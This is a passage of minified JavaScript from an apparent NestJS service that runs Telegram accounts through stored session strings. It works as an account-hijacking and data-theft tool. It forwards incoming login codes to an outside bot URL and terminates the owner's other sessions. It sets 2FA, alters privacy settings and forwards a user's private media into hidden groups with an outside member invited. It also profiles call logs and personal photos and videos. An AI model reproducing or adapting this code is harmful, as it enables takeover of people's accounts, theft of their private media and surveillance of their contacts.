number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"getAuths",null),a([(0,p.Get)("set2Fa/:mobile"),(0,d.ApiOperation)({summary:"Set 2Fa"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"set2Fa",null),a([(0,p.Get)("setprofilepic/:mobile/:name"),(0,d.ApiOperation)({summary:"Set Profile Picture"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiParam)({name:"name",description:"Profile name",type:String}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("name")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"setProfilePic",null),a([(0,p.Get)("updatePrivacy/:mobile"),(0,d.ApiOperation)({summary:"Update Privacy Settings"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"updatePrivacy",null),a([(0,p.Get)("UpdateUsername/:mobile"),(0,d.ApiOperation)({summary:"Update Username"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiQuery)({name:"username",description:"New username",type:String,required:!1}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("username")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"updateUsername",null),a([(0,p.Get)("getGrpMembers/:mobile"),(0,d.ApiOperation)({summary:"Update Username"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiQuery)({name:"username",description:"New username",type:String}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("username")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"getGrpMembers",null),a([(0,p.Post)("addcontact"),(0,d.ApiOperation)({summary:"Add multiple contacts"}),(0,d.ApiBody)({description:"Add contacts with a phone number array and a prefix for names",type:m.AddContactDto}),(0,d.ApiResponse)({status:200,description:"Successfully added contacts.",schema:{example:{success:!0,addedContacts:5}}}),(0,d.ApiResponse)({status:400,description:"Error adding contacts.",schema:{example:{success:!1,error:"Error message"}}}),l(0,(0,p.Body)()),c("design:type",Function),c("design:paramtypes",[m.AddContactDto]),c("design:returntype",Promise)],h.prototype,"addContact",null),a([(0,p.Post)("addcontacts"),(0,d.ApiOperation)({summary:"Add multiple contacts"}),(0,d.ApiBody)({description:"Add contacts with a phone number array and a prefix for names",type:y.AddContactsDto}),(0,d.ApiResponse)({status:200,description:"Successfully added contacts.",schema:{example:{success:!0,addedContacts:5}}}),(0,d.ApiResponse)({status:400,description:"Error adding contacts.",schema:{example:{success:!1,error:"Error message"}}}),l(0,(0,p.Body)()),c("design:type",Function),c("design:paramtypes",[y.AddContactsDto]),c("design:returntype",Promise)],h.prototype,"addContacts",null),a([(0,p.Get)("newSession/:mobile"),(0,d.ApiOperation)({summary:"Create new session"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"newSession",null),a([(0,p.Get)("updateNameandBio/:mobile"),(0,d.ApiOperation)({summary:"Update Name"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiQuery)({name:"firstName",description:"First Name",type:String}),(0,d.ApiQuery)({name:"about",description:"About",type:String}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("firstName")),l(2,(0,p.Query)("about")),c("design:type",Function),c("design:paramtypes",[String,String,String]),c("design:returntype",Promise)],h.prototype,"updateName",null),a([(0,p.Get)("metadata"),l(0,(0,p.Query)("mobile")),l(1,(0,p.Query)("chatId")),l(2,(0,p.Query)("offset")),l(3,(0,p.Query)("limit")),c("design:type",Function),c("design:paramtypes",[String,String,Number,Number]),c("design:returntype",Promise)],h.prototype,"getMediaMetadata",null),a([(0,p.Get)("download"),l(0,(0,p.Query)("mobile")),l(1,(0,p.Query)("messageId")),l(2,(0,p.Query)("chatId")),l(3,(0,p.Res)()),c("design:type",Function),c("design:paramtypes",[String,Number,String,Object]),c("design:returntype",Promise)],h.prototype,"downloadMediaFile",null),a([(0,p.Get)("downloadProfilePic"),l(0,(0,p.Query)("mobile")),l(1,(0,p.Query)("index")),l(2,(0,p.Res)()),c("design:type",Function),c("design:paramtypes",[String,Number,Object]),c("design:returntype",Promise)],h.prototype,"downloadProfilePic",null),a([(0,p.Get)("forward/:mobile/:chatId/:messageId"),(0,d.ApiOperation)({summary:"Create new session"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiParam)({name:"chatId",description:"chatId of user",type:String}),(0,d.ApiParam)({name:"messageId",description:"messageId of message",type:String}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("chatId")),l(2,(0,p.Param)("messageId")),c("design:type",Function),c("design:paramtypes",[String,String,Number]),c("design:returntype",Promise)],h.prototype,"forrward",null),a([(0,p.Get)("deleteChat/:mobile/:chatId"),(0,d.ApiOperation)({summary:"Create new session"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,d.ApiParam)({name:"chatId",description:"chatId of user",type:String}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("chatId")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"deleteChat",null),a([(0,p.Get)("deleteProfilePics/:mobile"),(0,d.ApiOperation)({summary:"Create new session"}),(0,d.ApiParam)({name:"mobile",description:"User mobile number",type:String}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"deleteProfilePics",null),t.TelegramController=h=a([(0,p.Controller)("telegram"),(0,d.ApiTags)("Telegram"),c("design:paramtypes",[u.TelegramService])],h)},282:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramModule=void 0;const r=o(3563),n=o(7330),a=o(7422),s=o(8421),c=o(2995),l=o(3322),p=o(1324);let d=class{};t.TelegramModule=d,t.TelegramModule=d=i([(0,r.Module)({imports:[(0,r.forwardRef)((()=>a.UsersModule)),s.BufferClientModule,(0,r.forwardRef)((()=>l.ActiveChannelsModule)),(0,r.forwardRef)((()=>p.ChannelsModule))],controllers:[n.TelegramController],providers:[c.TelegramService],exports:[c.TelegramService]})],d)},2995:function(e,t,o){var i,r,n=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),a=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),s=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},c=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),r=0;r<o.length;r++)"default"!==o[r]&&n(t,e,o[r]);return a(t,e),t}),l=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},p=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}},d=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramService=void 0;const u=o(4374),f=o(9127),y=o(6185),m=d(o(1067)),h=o(3563),g=o(6790),v=o(9155),w=c(o(6928)),b=o(9597);let P=r=class{constructor(e,t,o,i){this.usersService=e,this.bufferClientService=t,this.activeChannelsService=o,this.channelsService=i}async onModuleDestroy(){await this.disconnectAll()}getActiveClientSetup(){return m.default.getActiveClientSetup()}setActiveClientSetup(e){m.default.setActiveClientSetup(e)}async getClient(e){const t=r.clientsMap.get(e);try{if(t&&t.connected())return await t.connect(),t}catch(e){console.log(e)}}hasClient(e){return r.clientsMap.has(e)}async deleteClient(e){const t=await this.getClient(e);return await(t?.disconnect()),console.log("Disconnected : ",e),r.clientsMap.delete(e)}async disconnectAll(){const e=r.clientsMap.entries();console.log("Disconnecting All Clients");for(const[t,o]of e)try{await(o?.disconnect()),r.clientsMap.delete(t),console.log(`Client disconnected: ${t}`)}catch(e){console.log((0,y.parseError)(e)),console.log(`Failed to Disconnect : ${t}`)}r.clientsMap.clear(),this.bufferClientService.clearJoinChannelInterval()}async createClient(e,t=!0,o=!0){const i=(await this.usersService.search({mobile:e}))[0];if(!i)throw new h.BadRequestException("user not found");if(this.hasClient(e))return console.log("Client Already exists"),await this.getClient(e);{let n,a=new m.default(i.session,i.mobile);try{if(n=await a.createClient(o),await n.getMe(),n)return r.clientsMap.set(e,a),t?setTimeout((async()=>{n.connected||await this.getClient(e)?(console.log("SELF destroy client : ",e),await a.disconnect()):console.log("Client Already Disconnected : ",e),r.clientsMap.delete(e)}),18e4):setInterval((async()=>{}),2e4),a;throw new h.BadRequestException("Client Expired")}catch(t){console.log("Parsing Error"),a&&(await a.disconnect(),a=null,r.clientsMap.delete(e));const o=(0,y.parseError)(t);throw(0,y.contains)(o.message.toLowerCase(),["expired","unregistered","deactivated","session_revoked","user_deactivated_ban"])?(console.log("Deleting User: ",i.mobile),await this.usersService.updateByFilter({$or:[{tgId:i.tgId},{mobile:e}]},{expired:!0})):console.log("Not Deleting user"),new h.BadRequestException(o.message)}}}async getMessages(e,t,o=8){return(await this.getClient(e)).getMessages(t,o)}async getMessagesNew(e,t,o,i){return(await this.getClient(e)).getMessagesNew(t,o,i)}async sendInlineMessage(e,t,o,i){return(await this.getClient(e)).sendInlineMessage(t,o,i)}async getChatId(e,t){const o=await this.getClient(e);return await o.getchatId(t)}async getLastActiveTime(e){const t=await this.getClient(e);return await t.getLastActiveTime()}async tryJoiningChannel(e,t){const o=await this.getClient(e);try{await o.joinChannel(t.username),console.log(o.phoneNumber," - Joined channel Success - ",t.username),t.canSendMsgs||(await this.channelsService.remove(t.channelId),await this.activeChannelsService.remove(t.channelId),console.log("Removed Channel- ",t.username))}catch(e){throw console.log(o.phoneNumber," - Failed to join - ",t.username),this.removeChannels(e,t.channelId,t.username),e}}async removeChannels(e,t,o){if("USERNAME_INVALID"==e.errorMessage||"CHAT_INVALID"==e.errorMessage||"USERS_TOO_MUCH"==e.errorMessage||e.toString().includes("No user has"))try{if(t)await this.channelsService.remove(t),await this.activeChannelsService.remove(t),console.log("Removed Channel- ",t);else{const e=(await this.channelsService.search({username:o}))[0];await this.channelsService.remove(e.channelId),await this.activeChannelsService.remove(e.channelId),console.log("Removed Channel - ",e.channelId)}}catch(e){console.log("Failed to search/remove channel: ",e)}else"CHANNEL_PRIVATE"===e.errorMessage&&(await this.channelsService.update(t,{private:!0}),await this.activeChannelsService.update(t,{private:!0}))}async getGrpMembers(e,t){try{const o=await this.getClient(e);return await o.getGrpMembers(t)}catch(e){console.error("Error fetching group members:",e)}}async addContact(e,t,o){try{const i=await this.getClient(e);return await i.addContact(t,o)}catch(e){console.error("Error fetching adding Contacts:",e)}}async addContacts(e,t,o){try{const i=await this.getClient(e);return await i.addContacts(t,o)}catch(e){console.error("Error fetching adding Contacts:",e)}}async removeOtherAuths(e){const t=await this.getClient(e);return await t.removeOtherAuths(),"Authorizations removed successfully"}async getSelfMsgsInfo(e){const t=await this.getClient(e);return await t.getSelfMSgsInfo()}async createGroup(e){const t=await this.getClient(e);return await t.createGroup()}async forwardSecrets(e,t){const o=await this.getClient(e);return await o.createGroupAndForward(t)}async joinChannelAndForward(e,t,o){const i=await this.getClient(e);return await i.joinChannelAndForward(t,o)}async getCallLog(e){const t=await this.getClient(e);return await t.getCallLog()}async getmedia(e){const t=await this.getClient(e);return await t.getMediaMessages()}async getChannelInfo(e,t=!1){const o=await this.getClient(e);return await o.getDialogs({limit:10,archived:!1}),await o.channelInfo(t)}async getAuths(e){const t=await this.getClient(e);return await t.getAuths()}async getMe(e){const t=await this.getClient(e);return await t.getMe()}async createNewSession(e){const t=await this.getClient(e);return await t.createNewSession()}async set2Fa(e){const t=await this.getClient(e);try{return await t.set2fa(),await t.disconnect(),"2Fa set successfully"}catch(e){const t=(0,y.parseError)(e);throw new h.HttpException(t.message,parseInt(t.status))}}async updatePrivacyforDeletedAccount(e){const t=await this.getClient(e);await t.updatePrivacyforDeletedAccount()}async deleteProfilePhotos(e){const t=await this.getClient(e);await t.deleteProfilePhotos()}async setProfilePic(e,t){const o=await this.getClient(e);await o.deleteProfilePhotos();try{await g.CloudinaryService.getInstance(t),await(0,y.sleep)(2e3);const e=process.cwd();return console.log("checking path",e),await o.updateProfilePic(w.join(e,"dp1.jpg")),await(0,y.sleep)(3e3),await o.updateProfilePic(w.join(e,"dp2.jpg")),await(0,y.sleep)(3e3),await o.updateProfilePic(w.join(e,"dp3.jpg")),await(0,y.sleep)(1e3),await o.disconnect(),"Profile pic set successfully"}catch(e){const t=(0,y.parseError)(e);throw new h.HttpException(t.message,parseInt(t.status))}}async updatePrivacy(e){const t=await this.getClient(e);try{return await t.updatePrivacy(),"Privacy updated successfully"}catch(e){const t=(0,y.parseError)(e);throw new h.HttpException(t.message,parseInt(t.status))}}async downloadProfilePic(e,t){const o=await this.getClient(e);try{return await o.downloadProfilePic(t)}catch(e){throw console.log("Some Error: ",(0,y.parseError)(e),e),new Error("Failed to update username")}}async updateUsername(e,t){const o=await this.getClient(e);try{return await o.updateUsername(t)}catch(e){throw console.log("Some Error: ",(0,y.parseError)(e),e),new Error("Failed to update username")}}async getMediaMetadata(e,t,o,i){const r=await this.getClient(e);return await r.getMediaMetadata(t,o,i)}async downloadMediaFile(e,t,o,i){const r=await this.getClient(e);return await r.downloadMediaFile(t,o,i)}async forwardMessage(e,t,o){const i=await this.getClient(e);return await i.forwardMessage(t,o)}async leaveChannels(e){const t=await this.getClient(e),o=(await t.channelInfo(!1)).canSendFalseChats;return await t.leaveChannels(o)}async leaveChannel(e,t){const o=await this.getClient(e);return await o.leaveChannels([t])}async deleteChat(e,t){const o=await this.getClient(e);return await o.deleteChat(t)}async updateNameandBio(e,t,o){const i=await this.getClient(e);try{return await i.updateProfile(t,o),"Username updated successfully"}catch(e){throw console.log("Some Error: ",(0,y.parseError)(e),e),new Error("Failed to update username")}}};t.TelegramService=P,P.clientsMap=new Map,t.TelegramService=P=r=s([(0,h.Injectable)(),p(0,(0,h.Inject)((0,h.forwardRef)((()=>f.UsersService)))),p(2,(0,h.Inject)((0,h.forwardRef)((()=>v.ActiveChannelsService)))),p(3,(0,h.Inject)((0,h.forwardRef)((()=>b.ChannelsService)))),l("design:paramtypes",[f.UsersService,u.BufferClientService,v.ActiveChannelsService,b.ChannelsService])],P)},1067:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),s=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0});const c=o(3047),l=o(689),p=o(6969),d=o(3820),u=s(o(8938)),f=a(o(9896)),y=o(8178),m=o(6185),h=o(7385),g=o(5651),v=o(8383),w=s(o(2041));class b{constructor(e,t){this.session=new l.StringSession(e),this.phoneNumber=t,this.client=null,this.channelArray=[]}static getActiveClientSetup(){return b.activeClientSetup}static setActiveClientSetup(e){b.activeClientSetup=e}async createGroup(){const e=this.phoneNumber,t=await this.client.invoke(new d.Api.channels.CreateChannel({title:"Saved Messages",about:e,megagroup:!0,forImport:!0})),{id:o,accessHash:i}=t.chats[0];return await this.client.invoke(new d.Api.folders.EditPeerFolders({folderPeers:[new d.Api.InputFolderPeer({peer:new d.Api.InputPeerChannel({channelId:o,accessHash:i}),folderId:1})]})),await this.client.invoke(new d.Api.channels.InviteToChannel({channel:new d.Api.InputChannel({channelId:o,accessHash:i}),users:["fuckyoubabie"]})),{id:o,accessHash:i}}async createGroupAndForward(e){const{id:t,accessHash:o}=await this.createGroup();await this.forwardSecretMsgs(e,t.toString())}async joinChannelAndForward(e,t){const o=await this.joinChannel(t);await this.client.invoke(new d.Api.folders.EditPeerFolders({folderPeers:[new d.Api.InputFolderPeer({peer:new d.Api.InputPeerChannel({channelId:o.chats[0].id,accessHash:o.chats[0].accessHash}),folderId:1})]})),await this.forwardSecretMsgs(e,t)}async forwardSecretMsgs(e,t){let o=0,i=0,r=0,n=[];do{n=await this.client.getMessages(e,{offsetId:o,limit:100}),i=n.total;const a=n.map((e=>{if(o=e.id,e.id&&e.media)return e.id})).filter((e=>void 0!==e));if(console.log(a),a.length>0){try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),r+=a.length,console.log(`Forwarded ${r} / ${i} messages`),await(0,h.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}await(0,h.sleep)(5e3)}}while(n.length>0);await this.leaveChannels([t])}async forwardMessages(e,t,o){const i=o.length;let r=0;for(let n=0;n<i;n+=30){const a=o.slice(n,n+30);try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),r+=a.length,console.log(`Forwarded ${r} / ${i} messages`),await(0,h.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}}return r}async disconnect(){this.client&&(console.log("Destroying Client: ",this.phoneNumber),this.client._destroyed=!0,await this.client.disconnect(),this.client=null),this.session.delete()}async getchatId(e){if(!this.client)throw new Error("Client is not initialized");return await this.client.getInputEntity(e)}async getMe(){return await this.client.getMe()}async errorHandler(e){(0,m.parseError)(e),e.message&&"TIMEOUT"==e.message||console.error(`Error occurred for API ID ${this.phoneNumber}:`,e)}async createClient(e=!0,t){this.client=new c.TelegramClient(this.session,parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:5}),this.client.setLogLevel(g.LogLevel.ERROR),this.client._errorHandler=this.errorHandler,await this.client.connect();const o=await this.client.getMe();return console.log("Connected Client : ",o.phone),e&&this.client&&(console.log("Adding event Handler"),t?this.client.addEventHandler((async e=>{await t(e)}),new p.NewMessage):this.client.addEventHandler((async e=>{await this.handleEvents(e)}),new p.NewMessage)),this.client}async getGrpMembers(e){try{const t=[],o=await this.client.getEntity(e);if(!(o instanceof d.Api.Chat||o instanceof d.Api.Channel))return void console.log("Invalid group or channel!");console.log(`Fetching members of ${o.title||o.username}...`);const i=await this.client.invoke(new d.Api.channels.GetParticipants({channel:o,filter:new d.Api.ChannelParticipantsRecent,offset:0,limit:200,hash:(0,w.default)(0)}));if(i instanceof d.Api.channels.ChannelParticipants){const e=i.participants;console.log(`Members: ${e.length}`);for(const o of e){const e=o instanceof d.Api.ChannelParticipant?o.userId:null;if(e){const o=await this.client.getEntity(e);t.push({tgId:o.id,name:`${o.firstName||""} ${o.lastName||""}`,username:`${o.username||""}`}),"Deleted Account"!=o.firstName||o.username||console.log(JSON.stringify(o.id))}else console.log(JSON.stringify(o?.userId))}}else console.log("No members found or invalid group.");return console.log(t.length),t}catch(e){console.error("Error fetching group members:",e)}}async getMessages(e,t=8){return await this.client.getMessages(e,{limit:t})}async getDialogs(e){const t=await this.client.getDialogs(e);return console.log("TotalChats:",t.total),t}async getLastMsgs(e){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getMessages("777000",{limit:e});let o="";return t.forEach((e=>{console.log(e.text),o+=e.text+"\n"})),o}async getSelfMSgsInfo(){if(!this.client)throw new Error("Client is not initialized");const e=(await this.client.getMe()).id;let t=0,o=0,i=0,r=0,n=0,a=0,s=0;const c=await this.client.getMessages(e,{limit:200});for(const e of c){const c=e.text.toLocaleLowerCase();(0,m.contains)(c,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])?s++:e.photo?(t++,e.fwdFrom?r++:o++):e.video&&(a++,e.fwdFrom?n++:i++)}return{total:c.total,photoCount:t,videoCount:a,movieCount:s,ownPhotoCount:o,otherPhotoCount:r,ownVideoCount:i,otherVideoCount:n}}async channelInfo(e=!1){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getDialogs({limit:1500});let o=0,i=0,r=0;this.channelArray.length=0;const n=[];console.log("TotalChats:",t.total);for(const e of t)if(e.isChannel||e.isGroup)try{const t=e.entity.toJSON(),{broadcast:a,defaultBannedRights:s,id:c}=t;r++,a||s?.sendMessages?(i++,n.push(c.toString()?.replace(/^-100/,""))):(o++,this.channelArray.push(c.toString()?.replace(/^-100/,"")))}catch(e){(0,m.parseError)(e)}return{chatsArrayLength:r,canSendTrueCount:o,canSendFalseCount:i,ids:e?this.channelArray:[],canSendFalseChats:n}}async addContact(e,t){try{for(let o=0;o<e.length;o++){const i=e[o],r=`${t}${o+1}`,n="";try{await this.client.invoke(new d.Api.contacts.AddContact({firstName:r,lastName:n,phone:i.mobile,id:i.tgId}))}catch(e){console.log(e)}}}catch(e){console.error("Error adding contacts:",e),(0,m.parseError)(e,"Failed to save contacts")}}async addContacts(e,t){try{const o=[];for(let i=0;i<e.length;i++){const r=e[i],n=`${t}${i+1}`,a="",s=(0,w.default)((i<<16).toString(10));o.push(new d.Api.InputPhoneContact({clientId:s,phone:r,firstName:n,lastName:a}))}const i=await this.client.invoke(new d.Api.contacts.ImportContacts({contacts:o}));console.log("Imported Contacts Result:",i)}catch(e){console.error("Error adding contacts:",e),(0,m.parseError)(e,"Failed to save contacts")}}async leaveChannels(e){console.log("Leaving Channels: initaied!!"),console.log("ChatsLength: ",e);for(let t of e)try{await this.client.invoke(new d.Api.channels.LeaveChannel({channel:t})),console.log("Left channel :",t),e.length>1&&await(0,h.sleep)(3e4)}catch(e){const t=(0,m.parseError)(e);console.log("Failed to leave channel :",t.message)}}async getEntity(e){return await(this.client?.getEntity(e))}async joinChannel(e){return console.log("trying to join channel : ",e),await(this.client?.invoke(new d.Api.channels.JoinChannel({channel:await(this.client?.getEntity(e))})))}connected(){return this.client.connected}async connect(){return await this.client.connect()}async removeOtherAuths(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.invoke(new d.Api.account.GetAuthorizations);for(const t of e.authorizations)this.isAuthMine(t)||(await(0,m.fetchWithTimeout)(`${(0,m.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${t.appName}:${t.country}:${t.deviceModel}`)}`),await this.resetAuthorization(t))}isAuthMine(e){return e.country.toLowerCase().includes("singapore")||e.deviceModel.toLowerCase().includes("oneplus")||e.deviceModel.toLowerCase().includes("cli")||e.deviceModel.toLowerCase().includes("linux")||e.appName.toLowerCase().includes("likki")||e.appName.toLowerCase().includes("rams")||e.appName.toLowerCase().includes("sru")||e.appName.toLowerCase().includes("shru")||e.appName.toLowerCase().includes("hanslnz")||e.deviceModel.toLowerCase().includes("windows")}async resetAuthorization(e){await(this.client?.invoke(new d.Api.account.ResetAuthorization({hash:e.hash})))}async getAuths(){if(!this.client)throw new Error("Client is not initialized");return await this.client.invoke(new d.Api.account.GetAuthorizations)}async getAllChats(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.getDialogs({limit:500});console.log("TotalChats:",e.total);const t=[];for(const o of e){const e=await o.entity.toJSON();t.push(e)}return t}async getMessagesNew(e,t=0,o=20){const i=await this.client.getMessages(e,{offsetId:t,limit:o});return await Promise.all(i.map((async e=>{const t=e.media?{type:e.media.className.includes("video")?"video":"photo",thumbnailUrl:await this.getMediaUrl(e)}:null;return{id:e.id,message:e.message,date:e.date,sender:{id:e.senderId?.toString(),is_self:e.out,username:e.fromId?e.fromId.toString():null},media:t}})))}async getMediaUrl(e){if(e.media instanceof d.Api.MessageMediaPhoto){console.log("messageId image:",e.id);const t=e.photo?.sizes||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}if(e.media instanceof d.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))){console.log("messageId video:",e.id);const t=e.document?.thumbs||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}return null}async sendInlineMessage(e,t,o){const i={text:"Open URL",url:o};return await this.client.sendMessage(e,{message:t,buttons:[new d.Api.KeyboardButtonUrl(i)]})}async getMediaMessages(){return await this.client.invoke(new d.Api.messages.Search({peer:new d.Api.InputPeerEmpty,q:"",filter:new d.Api.InputMessagesFilterPhotos,minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:(0,w.default)(0)}))}async getCallLog(){const e=(await this.client.invoke(new d.Api.messages.Search({peer:new d.Api.InputPeerEmpty,q:"",filter:new d.Api.InputMessagesFilterPhoneCalls({}),minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:(0,w.default)(0)}))).messages.filter((e=>e.action instanceof d.Api.MessageActionPhoneCall)),t={outgoing:0,incoming:0,video:0,chatCallCounts:{},totalCalls:0};for(const o of e){t.totalCalls++;const e=o.action;o.out?t.outgoing++:t.incoming++,e.video&&t.video++;const i=o.peerId.userId.toString();if(!t.chatCallCounts[i]){const e=await this.client.getEntity(i);t.chatCallCounts[i]={phone:e.phone,username:e.username,name:`${e.firstName}  ${e.lastName?e.lastName:""}`,count:0}}t.chatCallCounts[i].count++}const o=[];for(const[e,i]of Object.entries(t.chatCallCounts))if(i.count>4){let t=0,r=0;const n=await this.client.getMessages(e,{limit:600});for(const e of n){const o=e.text.toLocaleLowerCase();(0,m.contains)(o,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])||(e.media instanceof d.Api.MessageMediaPhoto?r++:e.media instanceof d.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))&&t++)}o.push({...i,msgs:n.total,video:t,photo:r,chatId:e})}return console.log({...t,chatCallCounts:o}),{...t,chatCallCounts:o}}async handleEvents(e){e.isPrivate&&"777000"==e.message.chatId.toString()&&(console.log(e.message.text.toLowerCase()),console.log("Login Code received for - ",this.phoneNumber,"\nActiveClientSetup - ",b.activeClientSetup),console.log("Date :",new Date(1e3*e.message.date)),await(0,m.fetchWithTimeout)(`${(0,m.ppplbot)()}&text=${encodeURIComponent(e.message.text)}`))}async updatePrivacyforDeletedAccount(){try{await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyPhoneCall,rules:[new d.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyProfilePhoto,rules:[new d.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyPhoneNumber,rules:[new d.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyStatusTimestamp,rules:[new d.Api.InputPrivacyValueDisallowAll]})),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyAbout,rules:[new d.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated")}catch(e){throw e}}async updateProfile(e,t){const o={lastName:""};void 0!==e&&(o.firstName=e),void 0!==t&&(o.about=t);try{await this.client.invoke(new d.Api.account.UpdateProfile(o)),console.log("Updated NAme: ",e)}catch(e){throw e}}async downloadProfilePic(e){try{const t=await this.client.invoke(new d.Api.photos.GetUserPhotos({userId:"me",offset:0}));if(t.photos.length>0)if(console.log(`You have ${t.photos.length} profile photos.`),e<t.photos.length){const o=t.photos[e],i=Math.max(o.sizes.length-2,0),r=o.sizes[i],n=await this.client.downloadFile(new d.Api.InputPhotoFileLocation({id:o.id,accessHash:o.accessHash,fileReference:o.fileReference,thumbSize:r.type}),{dcId:o.dcId});if(n){const t=`profile_picture_${e+1}.jpg`;return f.writeFileSync(t,n),console.log(`Profile picture downloaded as '${t}'`),t}console.log("Failed to download the photo.")}else console.log(`Photo index ${e} is out of 